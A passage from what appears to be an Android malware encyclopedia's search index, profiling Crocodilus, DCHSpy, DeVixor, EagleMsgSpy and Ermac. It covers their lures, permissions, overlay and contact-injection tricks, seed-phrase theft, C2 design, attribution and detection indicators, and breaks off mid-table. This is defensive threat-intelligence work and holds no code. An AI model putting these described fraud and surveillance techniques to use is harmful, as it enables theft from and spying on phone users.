entered the scene as a fully-fledged threat rather than evolving incrementally from a simpler predecessor or forking from leaked source code. The initial samples contained debug-language artifacts suggesting a Turkish-speaking developer, though attribution remains unconfirmed.</p> <p>The speed of Crocodilus's feature development and geographic expansion suggests experienced operators. Within three months of initial discovery, ThreatFabric documented significant capability upgrades and expansion from two countries to eight, a pace that exceeds most new families.</p>"},{"location":"malware/families/crocodilus/#distribution","title":"Distribution","text":"<p>Crocodilus uses a proprietary dropper that bypasses Android 13+ restrictions on sideloaded apps. This is significant because Android 13 introduced tighter controls on granting accessibility service permissions to apps installed outside of official stores. The dropper circumvents these protections, allowing Crocodilus to obtain the accessibility permissions it needs for device takeover.</p> Vector Details Proprietary dropper Custom-built dropper that bypasses Android 13+ accessibility restrictions Social engineering Lures disguised as legitimate applications MaaS distribution Operators distribute through their own channels"},{"location":"malware/families/crocodilus/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/crocodilus/#core-features","title":"Core Features","text":"Capability Implementation Remote control Full device takeover through accessibility service Black screen overlay Displays black screen to hide remote operations from the victim Accessibility logger Captures all screen elements displayed on the device, not just keystrokes Credential theft Overlay attacks targeting banking and cryptocurrency apps Contact list injection Adds fake \"Bank Support\" contact entries to the victim's phone Seed phrase collector Automated harvesting of cryptocurrency wallet recovery phrases SMS interception Reads and forwards SMS for OTP capture"},{"location":"malware/families/crocodilus/#accessibility-logger","title":"Accessibility Logger","text":"<p>Crocodilus goes beyond standard keylogging by implementing a comprehensive accessibility logger that captures every element displayed on screen. This includes text fields, labels, buttons, and any other UI component rendered by the foreground application. The result is a complete record of everything the victim sees and interacts with, providing operators with credentials, account balances, transaction details, and seed phrases without requiring targeted overlay pages for each application.</p>"},{"location":"malware/families/crocodilus/#contact-list-injection","title":"Contact List Injection","text":"<p>The contact list injection technique is novel among Android banking trojans. Crocodilus writes fake entries directly into the victim's contact list, typically adding numbers labeled as \"Bank Support\" or similar trusted names. When the operators later call the victim from those numbers, the victim's phone displays the spoofed contact name, making the incoming call appear to originate from their bank. This enables highly convincing vishing (voice phishing) calls where the attacker poses as bank support staff and instructs the victim to approve transactions or provide additional credentials.</p>"},{"location":"malware/families/crocodilus/#cryptocurrency-seed-phrase-harvesting","title":"Cryptocurrency Seed Phrase Harvesting","text":"<p>ThreatFabric's June 2025 update documented an automated seed phrase collection mechanism. When the victim opens a cryptocurrency wallet app, Crocodilus displays a social engineering overlay instructing them to \"back up\" their wallet key by entering their seed phrase. The accessibility logger captures the entered phrase, which is then exfiltrated to the C2 server. This approach avoids the need for OCR-based seed theft from screenshots, instead tricking the victim into entering the phrase directly.</p>"},{"location":"malware/families/crocodilus/#permissions","title":"Permissions","text":"Permission Purpose BIND_ACCESSIBILITY_SERVICE Core dependency for device takeover, screen logging, and remote control SYSTEM_ALERT_WINDOW Display overlay injections and black screen during remote sessions READ_SMS Intercept SMS for OTP capture RECEIVE_SMS Real-time SMS interception READ_CONTACTS Read existing contacts before injecting fake entries WRITE_CONTACTS Inject fake \"Bank Support\" contact entries READ_PHONE_STATE Device fingerprinting INTERNET C2 communication REQUEST_INSTALL_PACKAGES Dropper installs main payload RECEIVE_BOOT_COMPLETED Persistence across reboots FOREGROUND_SERVICE Maintain persistent background operation"},{"location":"malware/families/crocodilus/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/crocodilus/#dropper-mechanism","title":"Dropper Mechanism","text":"<p>The proprietary dropper is a key technical differentiator. Android 13 introduced restrictions that prevent sideloaded apps from requesting accessibility service permissions, which is a critical dependency for device-takeover malware. Crocodilus's dropper bypasses this restriction through an implementation that ThreatFabric described as purpose-built to defeat current platform protections. The specifics of the bypass technique make Crocodilus one of the few families with a working solution for Android 13+ accessibility restrictions at the time of discovery.</p>"},{"location":"malware/families/crocodilus/#black-screen-overlay","title":"Black Screen Overlay","text":"<p>During remote access sessions, Crocodilus activates a black screen overlay combined with audio muting. This hides the operator's activity from the victim, who sees only a black screen and assumes the device is locked or idle. The technique is shared with other device-takeover trojans like Octo and Hook, but Crocodilus implements it alongside the full accessibility logger for comprehensive session capture.</p>"},{"location":"malware/families/crocodilus/#c2-communication","title":"C2 Communication","text":"<p>Crocodilus communicates with its command-and-control infrastructure over encrypted channels. The C2 delivers overlay injection targets, receives exfiltrated credentials and accessibility logs, and sends remote control commands for device takeover sessions.</p>"},{"location":"malware/families/crocodilus/#c2-infrastructure","title":"C2 Infrastructure","text":"Component Details Protocol HTTPS with encrypted payloads Data flow Bidirectional -- C2 pushes overlay configs and commands; bot sends credentials, accessibility logs, and device info Overlay delivery Injection HTML served from C2 and rendered in WebView Remote sessions Real-time command channel for device takeover operations Infrastructure rotation Observed domain changes between campaigns, suggesting operator-managed infrastructure"},{"location":"malware/families/crocodilus/#target-regions","title":"Target Regions","text":"Phase Period Regions Initial March 2025 Spain, Turkey Expansion By June 2025 Spain, Turkey, Argentina, Brazil, India, Indonesia, United States, and additional countries <p>The initial targeting of Spain and Turkey, combined with Turkish-language debug strings in early samples, suggests the developers had established connections in these markets. The rapid expansion to Latin America, South Asia, and the US within three months demonstrates the operators' ambition and capability to scale operations globally.</p> <p>Crocodilus also targets cryptocurrency wallets globally, independent of specific banking targets. The seed phrase harvesting capability works against any cryptocurrency wallet application regardless of the victim's country.</p>"},{"location":"malware/families/crocodilus/#notable-campaigns","title":"Notable Campaigns","text":"<p>March 2025: ThreatFabric publishes the initial discovery of Crocodilus targeting Spanish and Turkish banks along with cryptocurrency wallets. The analysis highlights the proprietary dropper bypassing Android 13+ restrictions, the accessibility logger, and the contact list injection technique. ThreatFabric notes that the malware arrived fully mature rather than evolving from a simpler predecessor.</p> <p>June 2025: ThreatFabric reports rapid evolution, documenting Crocodilus's expansion to eight countries including Argentina, Brazil, India, Indonesia, and the United States. The update reveals the addition of automated cryptocurrency seed phrase harvesting and continued refinement of the core device-takeover capabilities. The pace of development and geographic expansion confirms Crocodilus as a significant emerging threat in the mobile malware landscape.</p>"},{"location":"malware/families/crocodilus/#related-families","title":"Related Families","text":"<p>Crocodilus shares the device-takeover approach with several established families. Octo pioneered remote access via screen streaming in Android banking trojans, while Hook combined VNC-style remote access with the Cerberus/Ermac lineage. Both use black screen overlays to conceal remote sessions, as does Crocodilus. However, Crocodilus is not derived from any of these families.</p> <p>The contact list injection technique is unique to Crocodilus among known Android malware families. The closest parallel is Copybara's TOAD (Telephone-Oriented Attack Delivery) approach, which also combines malware with vishing calls, though Copybara relies on the operators initiating calls rather than planting fake contacts on the device.</p> <p>For cryptocurrency targeting, Crocodilus's social-engineering-driven seed phrase capture contrasts with the OCR-based approaches used by SparkCat and SpyAgent, which scan the device's photo gallery for screenshots of seed phrases.</p>"},{"location":"malware/families/crocodilus/#evolution","title":"Evolution","text":"Version Period Changes Initial March 2025 Full device takeover, accessibility logger, contact injection, overlay attacks targeting Spain and Turkey v2 By June 2025 Automated crypto seed phrase harvesting, expanded to 8 countries, refined remote access <p>The speed of evolution from regional threat to global operation within three months is notable. Most banking trojan families take 6-12 months to achieve comparable geographic expansion. ThreatFabric attributed this to the maturity of the codebase at launch, suggesting the developers had significant prior experience.</p>"},{"location":"malware/families/crocodilus/#detection","title":"Detection","text":"Indicator Type Details Accessibility service abuse App requesting accessibility with no legitimate UX justification Contact injection Unexpected new contacts with \"Bank Support\" or similar labels appearing without user action Dropper behavior APK circumventing Android 13+ accessibility restrictions for sideloaded apps Black screen activation Device appearing locked/idle while background network activity continues Overlay windows <code>TYPE_APPLICATION_OVERLAY</code> windows rendered over banking and crypto apps Turkish debug strings Debug artifacts in Turkish language in early samples"},{"location":"malware/families/crocodilus/#references","title":"References","text":"<ul> <li>ThreatFabric - Exposing Crocodilus: New Device Takeover Malware (March 2025)</li> <li>ThreatFabric - Crocodilus Mobile Malware Evolving Fast, Going Global (June 2025)</li> </ul>"},{"location":"malware/families/dchspy/","title":"DCHSpy","text":"<p>DCHSpy is an Iranian Android surveillanceware operated by MuddyWater, an espionage group linked to Iran's Ministry of Intelligence and Security (MOIS). Lookout discovered DCHSpy in July 2025, identifying 11 samples dating back to 2021. The malware is distributed through fake VPN apps (Earth VPN, Comodo VPN, Hide VPN) and StarLink connectivity lures, exploiting Iranian internet outages to convince targets to sideload trojanized utilities. DCHSpy collects WhatsApp data, contacts, SMS, files, location, and call logs while also recording audio and capturing photos. All exfiltrated data is transmitted via encrypted SFTP channels. Activity surged in the wake of Israeli strikes on Iranian nuclear infrastructure, with four new samples appearing within a single week, confirming its role as a reactive intelligence collection tool deployed during periods of geopolitical escalation.</p>"},{"location":"malware/families/dchspy/#overview","title":"Overview","text":"Attribute Details First Seen 2021 (earliest samples) Status Active, with surge in 2025 Type Surveillanceware, espionage Aliases None known Attribution MuddyWater (MOIS, Iran) Distribution Fake VPN apps, StarLink lures"},{"location":"malware/families/dchspy/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Lookout's July 2025 analysis traced DCHSpy samples back to 2021, establishing a four-year operational history before public disclosure. The malware is attributed to MuddyWater, an Iranian state-sponsored group that operates under the authority of Iran's Ministry of Intelligence and Security. MuddyWater has historically focused on desktop-based espionage campaigns targeting government entities, telecommunications companies, and defense organizations across the Middle East. DCHSpy represents the group's Android surveillance capability, extending their collection into mobile devices carried by targets of interest.</p> <p>The sustained development over four years with only 11 total samples indicates a highly targeted deployment model rather than mass distribution. This low sample volume is consistent with state-sponsored surveillance operations where each implant is delivered to a specific individual rather than cast broadly.</p>"},{"location":"malware/families/dchspy/#distribution","title":"Distribution","text":"Vector Details Earth VPN Fake VPN application impersonating a legitimate VPN service Comodo VPN Fake VPN application using the Comodo brand Hide VPN Fake VPN application promising anonymous browsing StarLink lures Fake satellite internet connectivity app exploiting Iranian internet outages <p>DCHSpy's distribution strategy is tightly coupled to the Iranian domestic environment. Iran periodically restricts or shuts down internet access during protests, elections, and military escalations. During these outages, demand for VPN tools and alternative connectivity solutions surges as citizens and activists attempt to circumvent censorship. MuddyWater exploits this demand by distributing trojanized VPN apps and StarLink connectivity lures through channels likely including messaging platforms, social media, and direct delivery to targets.</p> <p>The VPN lure pattern is particularly effective because targets already expect VPN apps to request broad device permissions (network access, background operation, storage). The StarLink lures appeared during periods when satellite internet was seen as a viable alternative to state-controlled infrastructure, making them credible to technically aware targets.</p>"},{"location":"malware/families/dchspy/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/dchspy/#core-features","title":"Core Features","text":"Capability Implementation WhatsApp data theft Exfiltrates WhatsApp databases and media files Contact exfiltration Harvests the full contact list from the device SMS collection Reads and exfiltrates all text messages File theft Accesses and uploads files from device storage Location tracking Collects GPS coordinates and location data Call log harvesting Extracts call history with numbers, timestamps, and durations Audio recording Records ambient audio via the device microphone Photo capture Takes photos using device cameras"},{"location":"malware/families/dchspy/#surveillance-focus","title":"Surveillance Focus","text":"<p>DCHSpy's capability set is optimized for intelligence collection against individuals rather than financial theft. The combination of WhatsApp data extraction, contact harvesting, and ambient audio recording provides operators with comprehensive visibility into a target's communications network, physical movements, and private conversations. WhatsApp is the dominant messaging platform in Iran and across the Middle East, making its data a high-priority collection target for understanding both personal and organizational communications.</p>"},{"location":"malware/families/dchspy/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/dchspy/#sftp-exfiltration","title":"SFTP Exfiltration","text":"<p>DCHSpy exfiltrates all collected data via encrypted SFTP (SSH File Transfer Protocol) rather than the HTTP-based channels used by most Android malware families. SFTP provides built-in encryption for data in transit, eliminating the need for a separate encryption layer within the malware itself. This choice also makes exfiltration traffic harder to distinguish from legitimate file transfer activity on the network.</p>"},{"location":"malware/families/dchspy/#low-volume-high-value-deployment","title":"Low-Volume, High-Value Deployment","text":"<p>Lookout identified only 11 total samples across the entire four-year operational period, reinforcing the assessment that each deployment is carefully targeted. The appearance of four new samples within a single week following Israeli strikes on Iranian nuclear infrastructure demonstrates that MuddyWater can rapidly scale collection activity in response to geopolitical events, likely deploying to additional targets during periods when intelligence demand increases.</p>"},{"location":"malware/families/dchspy/#target-regions","title":"Target Regions","text":"Region Details Iran (domestic) Primary target: dissidents, activists, journalists within Iran Middle East (broader) Secondary targeting aligned with MOIS intelligence priorities <p>DCHSpy targets Iranian dissidents, activists, and journalists, groups that MuddyWater and MOIS consider threats to the Iranian state. The VPN and StarLink lures are specifically designed for an Iranian audience navigating government-imposed internet restrictions. The targeting of domestic populations for surveillance aligns with MOIS's dual foreign and domestic intelligence mandate.</p>"},{"location":"malware/families/dchspy/#notable-campaigns","title":"Notable Campaigns","text":"<p>2021 to 2025: Lookout documented 11 samples spanning four years, distributed through fake VPN applications and StarLink lures. The sustained, low-volume campaign is consistent with targeted intelligence collection against specific individuals rather than broad-spectrum deployment.</p> <p>2025 (post-Israeli strikes): Four new DCHSpy samples appeared within a single week following Israeli strikes on Iranian nuclear infrastructure. This surge in activity demonstrates the malware's use as a reactive intelligence tool, with MuddyWater deploying additional implants during a period of heightened geopolitical tension when monitoring dissidents and activists becomes a higher priority for the Iranian state.</p>"},{"location":"malware/families/dchspy/#related-families","title":"Related Families","text":"Family Relationship AridSpy Both are state-sponsored Android surveillanceware targeting Middle Eastern populations. AridSpy (Arid Viper) uses trojanized messaging apps with a multistage architecture, while DCHSpy uses fake VPN lures with SFTP exfiltration. Both prioritize WhatsApp data and contact harvesting. GuardZoo Both are state-aligned Android surveillance tools operating in Middle Eastern conflict contexts. GuardZoo (Houthi-aligned) targets military personnel for GPS and mapping data, while DCHSpy targets civilian dissidents and activists for communications intelligence. PJobRAT Both distribute fake utility apps for espionage targeting specific regional populations. PJobRAT targeted Indian military personnel and later Taiwanese users with fake chat apps, while DCHSpy targets Iranian dissidents with fake VPN apps. Both prioritize messaging data extraction."},{"location":"malware/families/devixor/","title":"DeVixor","text":"<p>DeVixor is an Iranian Android banking RAT with ransomware capability discovered by Cyble in late 2025. With over 700 samples identified, DeVixor has evolved from a simple SMS harvester into a full-featured remote access trojan capable of banking fraud, credential theft, and file encryption with ransom demands payable via TRON cryptocurrency wallets. The malware uses Firebase for command-and-control communication and Telegram bots for administrative functions, allowing the developer to manage infections and receive alerts through Telegram channels. Distribution relies on phishing sites that impersonate Iranian automotive businesses. The developer openly operates a Telegram channel where version updates are published, demonstrating the brazen operational security posture common among Iranian cybercriminals who face minimal domestic law enforcement risk when targeting local victims.</p>"},{"location":"malware/families/devixor/#overview","title":"Overview","text":"Attribute Details First Seen Pre-2025 (evolved from earlier SMS harvester) Status Active, under continued development Type Banking RAT, ransomware, credential stealer Aliases None known Attribution Iranian developer (individual) Distribution Phishing sites impersonating Iranian automotive businesses"},{"location":"malware/families/devixor/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Cyble's analysis documented DeVixor's evolution from a basic SMS harvesting tool into a comprehensive banking RAT. The earliest versions focused solely on intercepting SMS messages, a capability commonly used to capture one-time passwords for Iranian banking services. Over successive versions, the developer added banking overlay attacks, credential theft, remote access functionality, and ultimately a ransomware module.</p> <p>The developer maintains a public Telegram channel where new versions are announced and feature updates are published. This open development model is characteristic of Iranian Android malware authors who operate with relative impunity within Iran's cybercrime ecosystem, particularly when their tools target domestic victims. The Telegram channel serves as both a marketing platform for potential buyers and a distribution point for updates.</p> <p>The identification of over 700 samples indicates prolific distribution or widespread adoption by multiple operators. This volume is significantly higher than targeted surveillance tools (which typically produce fewer than 50 samples) and aligns with financially motivated campaigns that prioritize scale.</p>"},{"location":"malware/families/devixor/#distribution","title":"Distribution","text":"Vector Details Automotive phishing sites Fake websites impersonating Iranian car manufacturers and dealerships Social engineering Victims directed to download apps from phishing sites via messaging platforms <p>The automotive industry lure is specifically tailored to the Iranian market. Car purchases in Iran frequently involve complex installment plans, registration processes, and government subsidy applications, all of which can be plausibly digitized into a mobile app. Victims downloading what they believe is an automotive services app are unlikely to question permission requests for SMS access, storage, and accessibility services, as these could be reasonably expected for a transaction management application.</p>"},{"location":"malware/families/devixor/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/devixor/#core-features","title":"Core Features","text":"Capability Implementation Banking overlay attacks Displays fake login screens over Iranian banking applications Credential theft Captures banking credentials, passwords, and authentication tokens SMS interception Reads and exfiltrates SMS messages, capturing OTPs and 2FA codes Remote access Full device control via RAT functionality Ransomware Encrypts device files and demands ransom via TRON cryptocurrency wallet Contact exfiltration Harvests the victim's contact list Call log harvesting Extracts call history Screen capture Takes screenshots of the device display"},{"location":"malware/families/devixor/#banking-fraud","title":"Banking Fraud","text":"<p>DeVixor targets Iranian banking applications with overlay attacks that display fake login screens when the victim opens a banking app. The overlays capture credentials, which are then used for unauthorized account access. Combined with SMS interception for OTP capture, the malware provides operators with everything needed to perform fraudulent transactions on the victim's banking accounts.</p>"},{"location":"malware/families/devixor/#ransomware-module","title":"Ransomware Module","text":"<p>The ransomware capability encrypts files on the device and presents a ransom demand payable to a TRON blockchain wallet address. TRON is a popular cryptocurrency choice for Iranian threat actors because it offers low transaction fees and is accessible through exchanges that do not enforce strict KYC (Know Your Customer) requirements. The combination of banking fraud and ransomware in a single tool allows operators to monetize infections through multiple channels: stealing funds directly from bank accounts and extorting the victim for file recovery.</p>"},{"location":"malware/families/devixor/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/devixor/#firebase-c2","title":"Firebase C2","text":"<p>DeVixor uses Google Firebase for command-and-control communication. Firebase provides a reliable, high-availability infrastructure that blends with legitimate Android app traffic. Commands are delivered to infected devices through Firebase messaging, and configuration updates can be pushed in real time without requiring the malware to poll a traditional C2 server.</p>"},{"location":"malware/families/devixor/#telegram-bot-administration","title":"Telegram Bot Administration","text":"<p>Operators manage DeVixor infections through Telegram bots. The bots provide real-time notifications when new devices are infected, allow operators to issue commands to specific devices, and relay exfiltrated data. This architecture eliminates the need for a dedicated C2 panel, leveraging Telegram's existing infrastructure for operational management.</p> Infrastructure Purpose Firebase C2 communication, command delivery, configuration updates Telegram bots Administrative interface, infection notifications, data relay TRON wallet Ransomware payment collection"},{"location":"malware/families/devixor/#evolution-timeline","title":"Evolution Timeline","text":"Phase Capabilities Early versions SMS harvesting only Mid-development Added banking overlays and credential theft Current version Full RAT with banking fraud, credential theft, remote access, and ransomware"},{"location":"malware/families/devixor/#target-regions","title":"Target Regions","text":"Region Details Iran Exclusive target: Iranian banking users and device owners <p>DeVixor targets Iranian users exclusively. The phishing sites impersonating automotive businesses, the banking overlay targets focusing on Iranian financial institutions, and the developer's public Telegram channel all confirm a purely domestic targeting scope. This exclusive focus on Iranian victims is consistent with the broader ecosystem of Iranian Android malware, where developers operate openly within Iran while targeting local users for financial gain.</p>"},{"location":"malware/families/devixor/#notable-campaigns","title":"Notable Campaigns","text":"<p>Pre-2025 (evolution period): DeVixor evolves from a basic SMS harvester through successive development iterations, adding banking overlays, credential theft, and remote access capabilities. The developer publishes updates through a Telegram channel, building out the tool's feature set incrementally.</p> <p>Late 2025: Cyble publishes their analysis documenting DeVixor as a fully evolved banking RAT with ransomware capability. The research identifies over 700 samples, Firebase-based C2 infrastructure, Telegram bot administration, and distribution through automotive phishing sites. The ransomware module demanding TRON cryptocurrency payments is highlighted as a notable feature combining banking fraud and extortion in a single tool.</p>"},{"location":"malware/families/devixor/#related-families","title":"Related Families","text":"Family Relationship Rafel RAT Both combine RAT functionality with ransomware capability on Android, a relatively uncommon pairing. Rafel RAT is open-source with global targeting across 120+ campaigns, while DeVixor is a closed-source tool targeting Iranian users exclusively. Both use cryptocurrency for ransom payments. Fakecalls Both are regional banking trojans focused on a single domestic market. Fakecalls targets South Korean banking users with voice call interception, while DeVixor targets Iranian banking users with overlay attacks and ransomware. Both demonstrate how banking trojans are adapted to specific national financial ecosystems."},{"location":"malware/families/eaglemsgspy/","title":"EagleMsgSpy","text":"<p>EagleMsgSpy is a lawful intercept surveillance tool developed by Wuhan Chinasoft Token Information Technology Co., Ltd. and deployed by public security bureaus across mainland China. Lookout disclosed the family in December 2024, identifying samples dating back to at least 2017. The tool operates as a two-component system: an installer APK (operated by a law enforcement officer with physical access to the unlocked target device) drops a headless surveillance module that persists in the background and exfiltrates collected data to C2 infrastructure. EagleMsgSpy harvests SMS, call logs, contacts, GPS coordinates, browser bookmarks, network activity, and messages from third-party chat applications including QQ, Telegram, Viber, WhatsApp, and WeChat. It also performs screen recording, screenshot capture, and audio recording. The C2 backend features an admin panel branded \"Stability Maintenance Judgment System\" (\u7ef4\u7a33\u7814\u5224\u7cfb\u7edf), and source code references to iOS handling functions suggest a corresponding iOS variant exists, though none has been identified to date.</p>"},{"location":"malware/families/eaglemsgspy/#quick-reference","title":"Quick Reference","text":"Attribute Details First Seen 2017 (earliest known samples) Last Seen Active as of late 2024 Status Active, under continued development Type Lawful intercept surveillanceware Attribution Wuhan Chinasoft Token Information Technology Co., Ltd. (developer); Chinese public security bureaus (operators) Distribution Physical access to unlocked device required; installer APK not found on Google Play or app stores"},{"location":"malware/families/eaglemsgspy/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/eaglemsgspy/#data-collection","title":"Data Collection","text":"Capability Details SMS harvesting Collects all SMS messages from the device Call logs Extracts full call history Contacts Exfiltrates device contact list GPS location Tracks device coordinates Browser bookmarks Harvests saved bookmarks and browsing data Network activity Monitors network connections and Wi-Fi information Third-party chat interception Captures messages from QQ, Telegram, Viber, WhatsApp, and WeChat Screen recording Records the device screen in real time Screenshot capture Takes screenshots on demand or automatically Audio recording Records ambient audio via microphone"},{"location":"malware/families/eaglemsgspy/#admin-panel","title":"Admin Panel","text":"<p>The C2 servers host an administrative panel called the \"Stability Maintenance Judgment System\" (\u7ef4\u7a33\u7814\u5224\u7cfb\u7edf), built with AngularJS. Authenticated operators can trigger real-time photo collection, initiate audio recordings, capture screenshots, block incoming calls and messages, view geographical heatmaps and distribution of a target's contacts, and retrieve the top 10 most frequently contacted individuals. The panel's source code contains functions like <code>getListIOS()</code> that distinguish between Android and iOS platforms, implying an iOS variant exists even though Lookout has not located one.</p>"},{"location":"malware/families/eaglemsgspy/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/eaglemsgspy/#two-component-architecture","title":"Two-Component Architecture","text":"<p>EagleMsgSpy uses a split installer-payload design:</p> Component Role Installer APK Operated by the individual with physical device access; deploys and configures the surveillance payload Surveillance module (headless) Runs without any visible UI; collects data, communicates with C2 <p>The installer is never distributed through app stores. Physical access to the unlocked device is the only known delivery method, consistent with a lawful intercept tool designed for use during police operations.</p>"},{"location":"malware/families/eaglemsgspy/#c2-communication","title":"C2 Communication","text":"<p>The surveillance module communicates with C2 servers using WebSockets over the STOMP messaging protocol to provide status updates and receive further instructions. Collected data is stored in a hidden directory on the device filesystem, then compressed, password-protected, and exfiltrated to C2 infrastructure. The string <code>tzsafe</code> appears in all known versions of the surveillance module as part of the encryption password, and the domain <code>tzsafe[.]com</code> was found in promotional materials linked to Wuhan Chinasoft Token.</p>"},{"location":"malware/families/eaglemsgspy/#obfuscation","title":"Obfuscation","text":"<p>Early variants of EagleMsgSpy employed minimal obfuscation. More recent samples use ApkToolPlus, an open-source application protection tool, to conceal portions of the code.</p>"},{"location":"malware/families/eaglemsgspy/#infrastructure-connections","title":"Infrastructure Connections","text":"<p>Two IP addresses tied to EagleMsgSpy C2 SSL certificates overlap with infrastructure used by other China-linked surveillance tools:</p> IP Address Connection 202.107.80[.]34 Used by 15 PluginPhantom samples from early 2017 to late 2020 119.36.193[.]210 Contacted by a CarbonSteal sample <p>Both PluginPhantom and CarbonSteal have been used to target Tibetan and Uyghur communities, placing EagleMsgSpy's infrastructure within a broader Chinese state surveillance ecosystem.</p>"},{"location":"malware/families/eaglemsgspy/#distribution","title":"Distribution","text":"<p>EagleMsgSpy requires physical access to the target's unlocked device. This is not a remotely deployed exploit, it is a tool designed for installation during physical custody of the device (arrests, border crossings, device inspections). Neither the installer nor the surveillance payload has been observed on Google Play or third-party app stores.</p>"},{"location":"malware/families/eaglemsgspy/#attribution","title":"Attribution","text":"<p>Lookout attributes EagleMsgSpy to Wuhan Chinasoft Token Information Technology Co., Ltd. with high confidence, based on:</p> <ul> <li>C2 server IP addresses previously pointed to by subdomains associated with the company</li> <li>The <code>tzsafe</code> string in the surveillance module matching the company's promotional domain</li> <li>Artifacts found in open C2 directories</li> <li>Source code references and OSINT investigation</li> </ul> <p>The company develops the tool; Chinese public security bureaus are the operational users.</p>"},{"location":"malware/families/eaglemsgspy/#references","title":"References","text":"<ul> <li>Lookout: EagleMsgSpy Chinese Android Surveillanceware</li> <li>The Hacker News: Chinese EagleMsgSpy Spyware Found Exploiting Mobile Devices Since 2017</li> <li>BleepingComputer: New EagleMsgSpy Android spyware used by Chinese police</li> <li>SecurityWeek: Mobile Surveillance Tool EagleMsgSpy Used by Chinese Law Enforcement</li> <li>The Record: Chinese provincial security teams used spyware to collect texts, audio recordings</li> <li>Security Affairs: China uses EagleMsgSpy surveillance tool</li> </ul>"},{"location":"malware/families/ermac/","title":"Ermac","text":"<p>Ermac is the Cerberus fork that proved a leaked source code could be refined into a competitive commercial product. Operated by the threat actor \"DukeEugene\" and sold as MaaS starting in late 2021, Ermac took the leaked Cerberus codebase, rewrote the encryption layer, updated the obfuscation, and expanded target coverage to over 460 banking and cryptocurrency applications. It served as DukeEugene's primary revenue stream until Hook replaced it in early 2023.</p>"},{"location":"malware/families/ermac/#overview","title":"Overview","text":"Attribute Details First Seen August 2021 Last Seen Late 2022 (superseded by Hook) Status Succeeded by Hook; Ermac 3.0 source leaked August 2025 Type Banking trojan (MaaS) Attribution \"DukeEugene\" (previously linked to BlackRock) Aliases Ermac 1.0, Ermac 2.0, HookBot (sometimes conflated) Source Built on leaked Cerberus source; Ermac 3.0 source leaked in 2025 Rental Price $3,000/month (v1.0), $5,000/month (v2.0)"},{"location":"malware/families/ermac/#origin-and-lineage","title":"Origin and Lineage","text":"<p>ThreatFabric identified Ermac in September 2021, calling it \"another Cerberus reborn.\" Code analysis confirmed that Ermac is a direct descendant of the leaked Cerberus source: it uses nearly identical data structures for C2 communication and retains the same overall architecture. The modifications focus on encryption, obfuscation, and expanded targeting rather than fundamental redesign.</p> <p>DukeEugene was already known as the operator behind BlackRock, another Android banking trojan discovered in 2020. ThreatFabric noted the cessation of fresh BlackRock samples coinciding with Ermac's emergence, indicating DukeEugene transitioned wholesale from BlackRock to Ermac. The actor advertised Ermac on the same underground forums where Cerberus had previously been sold, positioning it as a superior replacement.</p> <p>Ermac sits in the middle of the Cerberus lineage: downstream of the original source leak, upstream of Hook. When DukeEugene launched Hook in January 2023, NCC Group confirmed that Hook was built directly on Ermac's codebase, with all 30 Ermac bot commands present in Hook alongside 38 new additions.</p>"},{"location":"malware/families/ermac/#distribution","title":"Distribution","text":"<p>Ermac operators used multiple delivery channels, with a strong preference for phishing sites impersonating legitimate applications.</p> Vector Details Fake app websites Typosquatted domains mimicking legitimate services. Cyble documented a campaign using a fake Bolt Food delivery site targeting Polish users. Phishing pages Browser-based landing pages distributed via malvertising and social media posts Smishing SMS messages containing links to the fake app download pages Third-party stores APKs uploaded to unofficial Android app repositories Malvertising Paid ads redirecting to phishing domains <p>Ermac 2.0 distribution was particularly active against Polish users, with campaigns impersonating Bolt Food, banking apps, and browser updates. The fake sites were often near-identical to the originals, differing by only a single character in the domain name.</p>"},{"location":"malware/families/ermac/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/ermac/#ermac-10-august-2021","title":"Ermac 1.0 (August 2021)","text":"<p>Ermac 1.0 targeted 378 applications and rented for $3,000/month.</p> Capability Implementation Overlay attacks WebView-based injects triggered by accessibility service foreground detection SMS interception Read and redirect incoming SMS for OTP capture Contact harvesting Exfiltrate device contacts to C2 App listing Enumerate installed packages to determine overlay targets Account theft Steal accounts stored on the device via <code>AccountManager</code> Push notifications Display notifications to lure user into opening target apps App cache clearing Clear app data to force re-authentication, then capture fresh credentials via overlay Open URL Launch arbitrary URLs in the device browser"},{"location":"malware/families/ermac/#ermac-20-may-2022","title":"Ermac 2.0 (May 2022)","text":"<p>Ermac 2.0 expanded to 467 target applications and increased the rental price to $5,000/month. Cyble's analysis and Intel 471's deep dive documented the upgraded version.</p> Capability Implementation Expanded overlays 467 banking and cryptocurrency app targets (up from 378) Cryptocurrency wallet targeting Injects for major wallets including MetaMask, Trust Wallet, Coinbase 43 permissions Self-grants extensive permissions via accessibility on installation Improved obfuscation Updated string encryption and code obfuscation Broader geo-targeting Expanded from Eastern European focus to global coverage <p>Ermac 2.0 was the third most active Android banking trojan during Q2 2022.</p>"},{"location":"malware/families/ermac/#limitations-compared-to-successors","title":"Limitations Compared to Successors","text":"<p>Ermac notably lacked several features that would later appear in Hook:</p> Missing Feature Added In VNC/screen streaming Hook RAT with UI interaction Hook File manager Hook ATS (Automated Transfer System) Hook WhatsApp message extraction Hook WebSocket communication Hook"},{"location":"malware/families/ermac/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/ermac/#encryption","title":"Encryption","text":"<p>The most significant technical departure from Cerberus is the encryption scheme. Where Cerberus used a straightforward encryption approach for C2 communication, ThreatFabric noted that Ermac introduced:</p> <ul> <li>String encryption: Uses the Blowfish algorithm to encrypt hardcoded strings, resolved at runtime</li> <li>C2 communication: Data encrypted with AES-128-CBC, prepended with a double word containing the length of the encoded data (different from Cerberus's original scheme)</li> </ul>"},{"location":"malware/families/ermac/#c2-protocol","title":"C2 Protocol","text":"<p>Ermac communicates with its C2 server over HTTP. The protocol follows Cerberus's general pattern but with the updated encryption layer:</p> <ol> <li>Bot registers with C2, sending encrypted device fingerprint (IMEI, model, installed apps, SIM info)</li> <li>C2 responds with configuration: target app list, inject URLs, command queue</li> <li>Bot polls C2 at regular intervals for new commands</li> <li>Credential data from overlays is encrypted and POSTed back to C2</li> </ol> <p>Key bot commands:</p> Command Action <code>getSMS</code> Retrieve SMS messages from device <code>sentSMS</code> Send SMS from victim device <code>startApp</code> 